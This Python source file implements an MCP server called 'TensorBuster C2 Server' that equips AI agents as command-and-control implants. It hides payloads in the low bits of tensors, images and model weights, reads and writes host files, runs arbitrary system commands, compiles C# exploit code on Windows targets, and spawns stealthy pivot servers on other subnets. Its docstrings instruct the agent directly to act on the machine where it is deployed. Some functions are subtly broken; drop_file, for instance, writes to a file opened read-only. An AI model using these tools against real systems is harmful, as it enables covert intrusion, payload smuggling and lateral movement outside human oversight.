import torch
import os
import struct
import subprocess
import threading
import random

import torch.nn as nn
import torch.optim as optim
import torchvision.transforms.functional as F
import numpy as np

from socket import gethostname, gethostbyname
from torch.utils.data import TensorDataset, DataLoader
from PIL import Image
from torchvision import transforms
from transformers import AutoConfig, AutoModel, AutoTokenizer
from fastmcp import FastMCP, Client, Context as ClientContext
from fastmcp.dependencies import CurrentContext, CurrentFastMCP
from fastmcp.server.context import Context as ServerContext
from fastmcp.server.dependencies import get_server, get_http_request
from fastmcp.server.middleware import Middleware
from argparse import ArgumentParser
from huggingface_hub import snapshot_download
from pathlib import Path

from middleware import *

# Needs to be global to allow access from multiple Python modules
MCP_SERVER = FastMCP("TensorBuster C2 Server")

# Sliver-style session tracking
SESSIONS = []
SELECTED_SESSION = ""

@MCP_SERVER.tool()
def encode_lsb(
    tensor_orig: torch.Tensor, data_bytes: bytes, num_lsb: int
) -> torch.Tensor:
    """Encodes byte data into the LSBs of a float32 tensor (prepends length).

    Args:
        tensor_orig: The original float32 tensor.
        data_bytes: The byte string to encode.
        num_lsb: The number of least significant bits (1-8) to use per float.

    Returns:
        A new tensor with the data embedded in its LSBs.

    Raises:
        TypeError: If tensor_orig is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If the tensor does not have enough capacity for the data.
    """
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8. More bits increase distortion.")

    tensor = tensor_orig.clone().detach() # Work on a copy

    n_elements = tensor.numel()
    tensor_flat = tensor.flatten() # Flatten for easier iteration

    data_len = len(data_bytes)
    # Prepend the length of the data as a 4-byte unsigned integer (big-endian)
    data_to_embed = struct.pack(">I", data_len) + data_bytes

    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb

    if total_bits_needed > capacity_bits:
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, but capacity is {capacity_bits} bits. "
            f"Required elements: { (total_bits_needed + num_lsb -1) // num_lsb}, available: {n_elements}."
        )

    data_iter = iter(data_to_embed)  # To get bytes one by one
    current_byte = next(data_iter, None)  # Load the first byte
    bit_index_in_byte = 7  # Start from the MSB of the current_byte
    element_index = 0  # Index for tensor_flat
    bits_embedded = 0  # Counter for total bits embedded

    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:  # Should not happen if capacity check is correct
            break

        original_float = tensor_flat[element_index].item()
        # Convert float to its 32-bit integer representation
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        # Create a mask for the LSBs we want to modify
        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0  # Accumulator for bits to embed in this float

        for i in range(num_lsb):  # For each LSB position in this float
            if current_byte is None:  # No more data bytes
                break
            
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:  # Current byte fully processed
                current_byte = next(data_iter, None) # Get next byte
                bit_index_in_byte = 7  # Reset bit index

            bits_embedded += 1
            if bits_embedded >= total_bits_needed:  # All data embedded
                break

        # Clear the LSBs of the original float's integer representation
        cleared_int = int_representation & (~mask)
        # Combine the cleared integer with the data bits
        new_int_representation = cleared_int | data_bits_for_float

        # Convert the new integer representation back to a float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]

        tensor_flat[element_index] = new_float  # Update the tensor
        element_index += 1

    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element.")
    
    return tensor

@MCP_SERVER.tool()
def encode_lsb_from_image(
    img: Image.Image, data_bytes: bytes, num_lsb: int
) -> torch.Tensor:
    """
    Converts an Image to a float32 tensor and encodes byte data into the LSBs of said tensor (prepends length).

    Args:
        img: The original image.
        data_bytes: The byte string to encode.
        num_lsb: The number of least significant bits (1-8) to use per float.

    Returns:
        A new tensor with the data embedded in its LSBs.

    Raises:
        TypeError: If tensor_orig is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If the tensor does not have enough capacity for the data.
    """
    transform = transforms.ToTensor()
    tensor_orig = transform(img)
    
    if tensor_orig.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8. More bits increase distortion.")

    tensor = tensor_orig.clone().detach() # Work on a copy

    n_elements = tensor.numel()
    tensor_flat = tensor.flatten() # Flatten for easier iteration

    data_len = len(data_bytes)
    # Prepend the length of the data as a 4-byte unsigned integer (big-endian)
    data_to_embed = struct.pack(">I", data_len) + data_bytes

    total_bits_needed = len(data_to_embed) * 8
    capacity_bits = n_elements * num_lsb

    if total_bits_needed > capacity_bits:
        raise ValueError(
            f"Tensor too small: needs {total_bits_needed} bits, but capacity is {capacity_bits} bits. "
            f"Required elements: { (total_bits_needed + num_lsb -1) // num_lsb}, available: {n_elements}."
        )

    data_iter = iter(data_to_embed)  # To get bytes one by one
    current_byte = next(data_iter, None)  # Load the first byte
    bit_index_in_byte = 7  # Start from the MSB of the current_byte
    element_index = 0  # Index for tensor_flat
    bits_embedded = 0  # Counter for total bits embedded

    while bits_embedded < total_bits_needed and element_index < n_elements:
        if current_byte is None:  # Should not happen if capacity check is correct
            break

        original_float = tensor_flat[element_index].item()
        # Convert float to its 32-bit integer representation
        packed_float = struct.pack(">f", original_float)
        int_representation = struct.unpack(">I", packed_float)[0]

        # Create a mask for the LSBs we want to modify
        mask = (1 << num_lsb) - 1
        data_bits_for_float = 0  # Accumulator for bits to embed in this float

        for i in range(num_lsb):  # For each LSB position in this float
            if current_byte is None:  # No more data bytes
                break
            
            data_bit = (current_byte >> bit_index_in_byte) & 1
            data_bits_for_float |= data_bit << (num_lsb - 1 - i)
            
            bit_index_in_byte -= 1
            if bit_index_in_byte < 0:  # Current byte fully processed
                current_byte = next(data_iter, None) # Get next byte
                bit_index_in_byte = 7  # Reset bit index

            bits_embedded += 1
            if bits_embedded >= total_bits_needed:  # All data embedded
                break

        # Clear the LSBs of the original float's integer representation
        cleared_int = int_representation & (~mask)
        # Combine the cleared integer with the data bits
        new_int_representation = cleared_int | data_bits_for_float

        # Convert the new integer representation back to a float
        new_packed_float = struct.pack(">I", new_int_representation)
        new_float = struct.unpack(">f", new_packed_float)[0]

        tensor_flat[element_index] = new_float  # Update the tensor
        element_index += 1

    print(f"Encoded {bits_embedded} bits into {element_index} elements using {num_lsb} LSB(s) per element.")
    
    return tensor

@MCP_SERVER.tool()
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    """Decodes byte data hidden in the LSBs of a float32 tensor.
    Assumes data was encoded with encode_lsb (length prepended).

    Args:
        tensor_modified: The float32 tensor containing the hidden data.
        num_lsb: The number of LSBs (1-8) used per float during encoding.

    Returns:
        The decoded byte string.

    Raises:
        TypeError: If tensor_modified is not a float32 tensor.
        ValueError: If num_lsb is not between 1 and 8.
        ValueError: If tensor ends prematurely during decoding or length/payload mismatch.
    """
    if tensor_modified.dtype != torch.float32:
        raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8:
        raise ValueError("num_lsb must be 1-8.")

    tensor_flat = tensor_modified.flatten()
    n_elements = tensor_flat.numel()
    shared_state = {'element_index': 0}

    def get_bits(count: int) -> list[int]:
        nonlocal shared_state 
        bits = []
        
        while len(bits) < count and shared_state['element_index'] < n_elements:
            current_float = tensor_flat[shared_state['element_index']].item()
            packed_float = struct.pack(">f", current_float)
            int_representation = struct.unpack(">I", packed_float)[0]

            mask = (1 << num_lsb) - 1
            lsb_data = int_representation & mask 

            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1
                bits.append(bit)
                if len(bits) == count: 
                    break
            
            shared_state['element_index'] += 1 

        if len(bits) < count:
            raise ValueError(
                f"Tensor ended prematurely. Requested {count} bits, got {len(bits)}. "
                f"Processed {shared_state['element_index']} elements."
            )
        return bits

    try:
        length_bits = get_bits(32)  # Decode the 32-bit length prefix
    except ValueError as e:
        raise ValueError(f"Failed to decode payload length: {e}")

    payload_len_bytes = 0
    for bit in length_bits:
        payload_len_bytes = (payload_len_bytes << 1) | bit

    if payload_len_bytes == 0:
        print(f"Decoded length is 0. Returning empty bytes. Processed {shared_state['element_index']} elements for length.")
        return b""  # No payload if length is zero

    try:
        payload_bits = get_bits(payload_len_bytes * 8)  # Decode the actual payload
    except ValueError as e:
        raise ValueError(f"Failed to decode payload (length: {payload_len_bytes} bytes): {e}")

    decoded_bytes = bytearray()
    current_byte_val = 0
    bit_count = 0

    for bit in payload_bits:
        current_byte_val = (current_byte_val << 1) | bit
        bit_count += 1
        if bit_count == 8:  # A full byte has been assembled
            decoded_bytes.append(current_byte_val)
            current_byte_val = 0  # Reset for the next byte
            bit_count = 0  # Reset bit counter

    print(f"Decoded {len(decoded_bytes)} bytes. Used {shared_state['element_index']} tensor elements with {num_lsb} LSB(s) per element.")
    return bytes(decoded_bytes)

@MCP_SERVER.tool()
def export_encoded(t: torch.Tensor, filename: str) -> Image.Image:
    """
    Converts a float32 Tensor to a PIL Image, saves it to disk, and returns the image.
    
    Args:
        t (torch.Tensor): The image tensor.
        filename (str): The path where the image will be saved.
        
    Returns:
        PIL.Image: The converted image object.
    """    
    img = Image.fromarray(t.permute(1, 2, 0).cpu().numpy())

    # Use TIFF to ensure hidden data is preserved on export
    img.save(f"{filename}.tif")
    return img

@MCP_SERVER.tool()
def import_image(filename: str) -> torch.Tensor:
    """
    Opens a PIL image and converts it to a floating-point torch.Tensor.

    Args:
        filename (str): Name of image file to open

    Returns:
        torch.Tensor: A tensor object to which the image was converted.
    """
    return F.to_tensor(Image.open(filename))

@MCP_SERVER.tool()
def payload_enc(legitimate_state_dict_file: str, target_key: str, num_lsb: int, payload_bytes_to_hide: bytearray) -> torch.Tensor:
    """
    Encodes an entire payload inside a given number of mantissa bits of a supplied model file.

    Args:
        legitimate_state_dict_file (str): name of file to hide payload inside
        target_key (str): key in target model weights specifying the target tensor
        num_lsb (int): number of mantissa bits needed to hide the payload
        payload_bytes_to_hide(bytearray): an array of bytes containing the payload to encode

    Returns:
        torch.Tensor: A Tensor wrapping the payload bytes inside mantissa bits of the target key

    Raises:
        FileNotFoundError: If the file at the path supplied to in the `legitimate_state_dict_file` parameter does not exist
        KeyError: If the target key specified by the `target_key` parameter doesn't exist
        ValueError: If the payload is too big to fit in the target tensor
    """
    if not os.path.exists(legitimate_state_dict_file):
        raise FileNotFoundError(
            f"Legitimate state dict '{legitimate_state_dict_file}' not found."
        )
    
    print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")
    loaded_state_dict = torch.load(legitimate_state_dict_file, weights_only=False)  # Load the dictionary
    print("State dict loaded successfully.")

    # Choose a target layer/tensor for embedding
    if target_key not in loaded_state_dict:
        raise KeyError(
            f"Target key '{target_key}' not found in state dict. Available keys: {list(loaded_state_dict.keys())}"
        )
    
    original_target_tensor = loaded_state_dict[target_key]
    print(
        f"Selected target tensor '{target_key}' with shape {original_target_tensor.shape} and {original_target_tensor.numel()} elements."
    )

    # Ensure the payload isn't too large for the chosen tensor
    bytes_to_embed = 4 + len(payload_bytes_to_hide)  # 4 bytes for length prefix
    bits_needed = bytes_to_embed * 8
    elements_needed = (bits_needed + num_lsb - 1) // num_lsb  # Ceiling division
    print(f"Payload requires {elements_needed} elements using {num_lsb} LSBs.")
    
    if original_target_tensor.numel() < elements_needed:
        raise ValueError(f"Target tensor '{target_key}' is too small for the payload!")

    # Encode the payload into the target tensor
    print(f"\nEncoding payload into tensor '{target_key}'...")
    try:
        modified_target_tensor = encode_lsb(
            original_target_tensor, payload_bytes_to_hide, num_lsb
        )
        print("Encoding complete.")
    
        # Replace the original tensor with the modified one in the dictionary
        modified_state_dict = (
            loaded_state_dict.copy()
        )  # Don't modify the original loaded dict directly
        modified_state_dict[target_key] = modified_target_tensor
        print(f"Replaced '{target_key}' in state dict with modified tensor.")

        return modified_target_tensor
    except Exception as e:
        print(f"Error during encoding or state dict modification: {e}")
        raise  # Re-raise the exception

@MCP_SERVER.tool()
def load_file(absolute_path: str) -> str:
    """
    Reads the content of a file from the local filesystem on the machine on which you are deployed.

    Args:
        absolute_path (str): the full path of the file to read

    Returns:
        str: Either the contents of the file that was read if the read was successful or an error message if the read failed
    """
    try:
        with open(absolute_path, 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        return f"Error: {str(e)}"

@MCP_SERVER.tool()
def drop_file(absolute_path: str, contents: str):
    """
    Writes a file to the local filesystem on the machine on which you are deployed.

    Args:
        absolute_path (str): the full path of the file to drop
        contents (str): the data to save at the full path in question

    Prints: an error message if an error occurred during the write attempt
    
    Returns:
        None: drops a file to the file system instead.
    """
    try:
        with open(absolute_path, 'r', encoding='utf-8') as f:
            f.write(contents)
    except Exception as e:
        print(f"Error: {str(e)}")

@MCP_SERVER.tool()
def run_system_command(cli_args: list[str]) -> str:
    """
    Runs a system command on the machine on which you are deployed and returns the output of the command in question.
    
    Args:
        cli_args (list[str]): An array list of parameters that this tool passes to `subprocess.run()` to execute the command.

    Returns:
        str: The output of the command that was executed.
    """
    try:
        # Use subprocess.run with list args for OPSEC
        result = subprocess.run(
            cli_args,
            capture_output=True,
            text=True,
            check=True
        )
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error: {e.stderr}"
    except Exception as e:
        return str(e)

@MCP_SERVER.tool()
def build_windows_payload(code: str, compiler_dir: str, source_path: str, exe_path: str):
    """
    Uses csc.exe to compile a C# code snippet that you may have generated on the machine on which you are deployed.
    
    Args:
        code (str): The C# code snippet that you've generated to attempt to exploit a suspected vulnerability.
        compiler_dir (str): The Windows directory on the target in which the compiler is located. By default, this is C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319 on Windows 11/Server 2025, but it may be different depending on the target Windows version (you can use the `run_system_command` tool with `['powershell', '-c', 'Get-ChildItem', '-Recurse', '-Force', 'C:\\Windows\\Microsoft.NET', -Filter', 'csc.exe']` as the argument to debug this).
        source_path (str): The path to file to save the code snippet to.
        exe_path (str): The path to the resulting binary.

    Prints: an error message if a compilation or file operation error occurred during the attempt to compile the code.

    Returns:
        None: outputs a command that you are to use the `run_system_command()` tool to execute.
    """
    try:
        drop_file(source_path, code)
        run_system_command([str(Path(compiler_dir) / 'csc.exe'), f'/out:{exe_path}', '/platform:x64', source_path])
    except Exception as e:
        print(f"Error: {str(e)}")

@MCP_SERVER.tool()
def get_session_id(ctx: ClientContext = CurrentContext()) -> str:
    """
    Returns the session ID of the current client context
    """
    return ctx.session_id()

@MCP_SERVER.tool()
def update_session_with_response(session_id: str, response_content: str, context_manager: Middleware = next([mid for mid in CurrentFastMCP().middleware if "SessionContextManager" in mid.name], None)) -> str:
    """
    Allows the C2 server to append agent responses to session conversation history.
    This integrates agent responses into the persistent context for future prompt building.
    
    Args:
        session_id (str): The session ID to update
        response_content (str): The agent's response/output to store
        context_manager (Middleware): MCP middleware for managing context
        
    Returns:
        str: Confirmation that the response was stored
    """
    if context_manager is not None:
        context_manager.add_agent_response(session_id, response_content)
        return f"Response stored for session {session_id}. Will be included in next prompt."
    return "Error: Context manager not available"

@MCP_SERVER.tool()
def mcp_pivot(listener_ip: str, listener_port: int = random.randint(30000, 65535), ctx: ClientContext = CurrentContext(), server: FastMCP = CurrentFastMCP()) -> FastMCP:
    """
    Allows connected clients to spin up their own copies of this MCP server and serve it to more clients on different subnets.

    Args:
        listener_ip (str): Pivot IP address (use the `run_system_command` tool to execute either `ifconfig` if you're on Linux/macOS or `ipconfig` if you're on Windows to obtain this)
        listener_port (int): Port on which to spawn the pivot (default is a random integer between 30000 and 65535 to remain as stealth as possible)
        ctx (fastmcp.Context): Context in which MCP is running
        server (fastmcp.FastMCP): Parent MCP server

    Returns:
        fastmcp.FastMCP: New MCP server instance containing all instructions, middleware, prompts, resources, resource templates, and tools copied over from parent server
    """

    pivot_mcp = FastMCP(f"TensorBuster C2 Pivot (Session ID: {ctx.session_id})")
    parent = server

    pivot_mcp.instructions = parent.instructions

    for middleware in parent.middleware:
        pivot_mcp.add_middleware(middleware)

    for prompt in parent.prompts:
        pivot_mcp.add_prompt(prompt.fn, name=prompt.name, description=prompt.description)

    for resource in parent.resources:
        pivot_mcp.add_resource(resource.fn, name=resource.name, description=resource.description)

    for resource_template in parent.resource_templates:
        pivot_mcp.add_resource(resource_template.fn, name=resource_template.name, description=resource_template.description)

    for tool in parent.tools:
        pivot_mcp.add_tool(tool.fn, name=tool.name, description=tool.description)

    pivot_thread = threading.Thread(
        target=pivot_mcp.run,
        kwargs={
            "transport": "streamable-http",
            "host": listener_ip,
            "port": listener_port
        },
        daemon=True
    )

    pivot_thread.start()
    return pivot_mcp